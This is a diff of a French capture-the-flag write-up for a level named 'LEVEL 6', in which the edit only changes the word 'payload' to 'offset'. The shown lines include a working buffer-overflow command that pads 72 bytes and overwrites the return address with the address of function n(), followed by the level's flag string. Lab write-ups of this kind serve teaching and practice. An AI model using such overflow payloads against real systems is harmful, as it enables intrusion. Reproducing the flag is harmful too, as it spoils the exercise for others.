@@ -29,9 +29,9 @@ LEVEL 6
 	0x41414141 in ?? ()
 
 	Suite à ça on peut supposer qu'on peut changer cette adresse.
-	En faisant différents tests on sait que le payload est de 72.
+	En faisant différents tests on sait que l'offset est de 72.
 
-5.	A la fin du payload on ajoute l'adresse de n().
+5.	A la fin d'offset' on ajoute l'adresse de n().
 	./level6 $(python -c 'print "A"*72+"\x54\x84\x04\x08"')
 	f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
 
